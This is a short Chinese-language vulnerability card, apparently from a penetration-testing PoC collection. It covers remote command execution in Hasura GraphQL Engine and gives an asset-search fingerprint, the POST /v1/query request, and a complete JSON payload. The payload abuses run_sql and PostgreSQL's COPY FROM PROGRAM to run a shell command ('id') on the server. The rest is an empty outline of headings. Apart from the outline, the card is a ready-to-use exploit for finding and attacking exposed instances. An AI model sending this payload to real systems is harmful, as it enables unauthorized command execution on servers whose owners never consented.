# HasuraGraphQLEngine远程命令执行漏洞

- **系统**：HasuraGraphQLEngine　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"Hasura GraphQL"`
- **请求**：`POST /v1/query HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 352`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
{"type": "bulk", "args": [{"type": "run_sql", "args": {"sql": "SET LOCAL statement_timeout = 10000;", "cascade": false, "read_only": false}}, {"type": "run_sql", "args": {"sql": "DROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id';\nSELECT * FROM cmd_exec;", "cascade": false, "read_only": false}}]}
```

**其他**
- Hasura GraphQL Engine 远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Hasura GraphQL Engine